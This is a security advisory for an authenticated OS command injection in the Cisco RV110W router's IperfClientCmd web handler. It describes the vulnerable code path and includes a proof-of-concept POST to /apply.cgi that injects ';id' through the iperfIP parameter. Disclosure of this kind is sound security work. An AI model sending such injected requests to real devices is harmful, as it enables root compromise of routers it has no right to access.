## Cisco RV110W IperfClientCmd 命令注入

### Title

```
Cisco RV110W IperfClientCmd OS Command Injection
```

### Vendor

```
Cisco Systems
```

### Product

```
RV110W Wireless-N VPN Firewall
```

### Version

```
Firmware <= 1.2.1.7 (final release, EOL)
```

### Component

```
/usr/sbin/httpd — IperfClientCmd handler (0x414e78)
```

### Vulnerability Type

```
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
An OS command injection vulnerability exists in the IperfClientCmd function
(address 0x414e78) of the httpd binary in Cisco RV110W firmware <= 1.2.1.7.

The function reads 6 HTTP parameters via get_cgi() (at 0x41a534):
sys_iperfIP, sys_iperfTime, sys_iperfPort, sys_iperfInterval,
sys_iperfWinSize, sys_iperfMode. These values are concatenated via
sprintf() into a shell command string and passed directly to system()
(PLT 0x500310) without any input sanitization.

The constructed command is:
  iperf -c <iperfIP> -t <iperfTime> -p <iperfPort> -i <iperfInterval>
  -w <iperfWinSize> -fm <iperfMode> > /tmp/result.txt

An authenticated attacker can inject arbitrary OS commands through any
of the 6 parameters. The injected commands execute as root.

Verification: angr symbolic execution confirmed tainted data reaches
system() after 73 steps through 72 basic blocks.
```

### Proof of Concept

```http
POST /apply.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

submit_button=Diagnostics&change_action=gozila_cgi&submit_type=IperfClientCmd&iperfIP=;id&iperfTime=10&iperfPort=5001&iperfInterval=1&iperfWinSize=8K&iperfMode=m
```

Executed command: `iperf -c ;id -t 10 -p 5001 -i 1 -w 8K -fm m > /tmp/result.txt`

### Affected Parameters

```
iperfIP, iperfTime, iperfPort, iperfInterval, iperfWinSize, iperfMode
```

### References

```
- Cisco RV110W EOL: https://www.cisco.com/c/en/us/products/routers/rv110w-wireless-n-vpn-firewall/eos-eol-notice-listing.html
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- Known CVEs on same device (none cover this function):
  CVE-2019-1663 (buffer overflow, login), CVE-2022-20900 (different function),
  CVE-2020-3144 (session management)
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution engine.
```

